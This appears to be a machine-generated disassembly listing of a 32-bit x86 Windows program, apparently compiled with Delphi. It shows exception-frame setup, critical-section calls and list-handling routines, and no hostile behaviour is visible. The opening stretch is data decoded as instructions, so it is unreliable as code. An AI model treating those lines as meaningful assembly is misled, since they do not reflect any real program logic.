add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
popad
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x60 ] dl
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edx + ebp * 4 ] cl
inc ecx
add ah dh
mov [ 0xffffffffa8380041 ] eax
inc ecx
add [ eax + ebp * 4 + 0x41 ] cl
add ah ch
cmpsd [ esi ] [ edi ]
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc ecx
add al bh
movsb [ edi ] [ esi ]
inc ecx
add [ eax + ebp * 4 ] cl
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insb
push ebx
je r-xdata
outsb
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
insd
mov [ ecx + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x100041 ] ah
add [ eax ] al
mov esp 0xb400415f
xor eax [ eax ]
shl [ ebx ] 0x40
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add ah dh
mov [ 0xffffffffa4400041 ] eax
inc ecx
add [ eax - 0x5c ] bl
inc ecx
add [ eax - 0x56 ] cl
inc ecx
add [ ecx + ebp + 0x40 ] ch
add [ eax + 0x7c0041aa ] al
movsd [ edi ] [ esi ]
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
popad
jl r-xdata
je r-xdata
add [ ebp + 0x609c0040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004160 ] bh
add [ eax ] al
add [ edi + ebx * 2 + 0x33b40041 ] bh
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
jns r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
inc ecx
add [ eax + eax ] dl
add [ eax ] al
cmp al 0x61
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edx + ebp * 4 - 0x5c0bffbf ] ah
inc ecx
add [ eax - 0x55 ] cl
inc ecx
add [ eax - 0x5c ] bl
inc ecx
add [ eax - 0x56 ] cl
inc ecx
add [ eax ] al
lodsb [ esi ]
inc ecx
add [ eax + 0x7c0041aa ] al
movsd [ edi ] [ esi ]
inc ecx
add [ ebx + ebp * 4 + 0x41 ] dh
add [ 0x6d654d54 ] cl
inc ecx
add [ ebp + 0x41 ] bh
hlt
je r-xdata
outsd
jb r-xdata
insd
popad
insd
add al 0x62
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
push ebx
outsd
popad
insd
mov eax eax
and [ edx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
bound eax [ ecx ]
sbb [ eax ] al
add [ eax ] al
cmp al 0x61
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ebp + ebp * 4 - 0x5c0bffbf ] al
inc ecx
add [ eax - 0x5c ] al
inc ecx
add [ eax - 0x5c ] bl
inc ecx
add [ eax - 0x56 ] cl
inc ecx
add [ ebp + ebp * 4 - 0x557fffbf ] bh
inc ecx
add [ ebp + 0x41 ] bh
add [ edi ] cl
push esp
push edx
jae r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
sub_416870
les ebx [ ecx + 0x41 ]
add [ edx ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
jae r-xdata
add [ eax + esi * 8 - 0x14c7ffbf ] al
arpl [ ecx + 0x63 ] ax
je r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edi + ebp * 8 ] dh
inc ecx
add [ eax ] dh
out dx eax
inc ecx
add [ eax - 0x11 ] ch
inc ecx
add al cl
out dx eax
inc ecx
add [ edi + ebp * 8 - 0x1033ffbf ] bl
inc ecx
add ah ch
out dx al
inc ecx
add [ eax - 0x2bffbe11 ] al
out dx eax
inc ecx
add [ eax ] dl
push esp
inc edx
popad
jae r-xdata
inc cx
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
popad
insd
cmp al 0x10
inc eax
add [ eax + eax ] cl
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
or al 0x69
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 ] ch
inc ecx
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
add [ esi + 0x41 ] ch
inc ecx
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add al ah
out dx eax
inc ecx
add [ ecx + esi * 8 + 0x41 ] al
add al ch
cmp bl ch
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x8c00408d
imul eax [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_416951
imul eax [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
aam 0x69
inc ecx
add ah bl
imul eax [ ecx ] 0x54
pushad
inc ecx
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax + esi * 8 ] ah
inc ecx
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
or al 0x54
inc edx
popad
jae r-xdata
[ edi + 0x5e ]
pop ebx
retn
arpl [ ecx + 0x63 ] ax
je sub_416a50
outsd
outsb
lea eax [ eax ]
sub_416a38
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4060e4
pop edi
pop esi
pop ebx
retn
sub_416a60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4060c8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416a88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4060ec
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416b80
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_417e94
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403398
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403398
test al al
je r-xdata
sub_416be0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_416b80
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416b80
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403398
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_416c50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_40313c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_417d38
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_416ccc
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
mov eax [ esi + 0x4 ]
call sub_40316c
mov eax [ esi + 0x8 ]
call sub_40316c
mov eax [ esi + 0xc ]
call sub_40316c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_416d0c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_417e94
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4030d0
test al al
jne r-xdata
sub_416d6c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_417e94
mov edx eax
mov eax ebp
call sub_403398
test al al
jne r-xdata
sub_416db0
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416e4b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030bc
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041a4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_416d0c
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_417d38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e52
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
sub_416e70
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405288
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_416e90
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_417e94
mov edx edi
call sub_416e70
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_417e94
mov edx edi
call sub_416e70
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_417d84
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_416e70
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_417d84
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_416f34
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_417e94
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_416d6c
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_416f80
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40313c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416c50
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_417d38
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_416ff4
push ebx
push esi
push edi
push ebp
call sub_4034f8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
mov eax [ esi + 0x4 ]
mov edx edi
call sub_417e94
call sub_40316c
inc edi
dec ebp
jne r-xdata
sub_417050
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_417e94
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_416be0
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_417094
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_416d0c
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_417e94
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_4170d8
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_41715b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4030bc
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417162
lea eax [ ebp - 0x10c ]
call sub_403f40
retn
sub_417168
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417050
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_416b74
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4170d8
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_417e94
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417e94
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403398
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417050
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417d84
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_417d38
sub_417254
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_417e94
mov edx ebp
call sub_416e58
test al al
jne r-xdata
sub_417298
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_416c50
mov edx eax
mov eax [ edi + 0x4 ]
call sub_417d38
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_417e94
mov eax [ eax + 0xc ]
mov edx ebp
call sub_417ef0
test eax eax
jge r-xdata
sub_4172f4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417e94
mov esi eax
mov edx ebp
mov eax esi
call sub_416e90
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_40316c
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417d84
sub_417344
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40313c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_417230
xor eax eax
push ebp
push sub_417443
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403490
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41744a
mov eax [ rw-data ]
call sub_4172e8
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_417d38
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_417e94
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_416d6c
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_417d38
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_417e94
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_41744a
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_417470
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_4174a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_417230
xor edx edx
push ebp
push sub_417517
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4172e8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_4039a4
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_417e94
mov edx [ ebp - 0x4 ]
call sub_416d0c
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417534
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417594
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41759b
lea eax [ ebp - 0xc ]
call sub_403f40
retn
sub_4175a0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417230
xor eax eax
push ebp
push sub_4175e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417094
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4175ed
mov eax [ rw-data ]
call sub_4172e8
retn
sub_4175f4
push ebx
push esi
mov esi eax
mov eax esi
call sub_4175a0
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_417534
sub_417614
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417230
xor eax eax
push ebp
push sub_417679
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417254
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41723c
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417680
mov eax [ rw-data ]
call sub_4172e8
retn
mov eax ebx
call sub_4030f8
mov ebx eax
sub_417684
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417230
xor eax eax
push ebp
push sub_4176c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4172f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4176cd
mov eax [ rw-data ]
call sub_4172e8
retn
sub_4176d0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417230
xor eax eax
push ebp
push sub_417712
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417298
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417719
mov eax [ rw-data ]
call sub_4172e8
retn
sub_41771c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_417230
xor eax eax
push ebp
push sub_417763
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_417168
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41776a
mov eax [ rw-data ]
call sub_4172e8
retn
sub_417770
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417230
xor eax eax
push ebp
push sub_4177be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
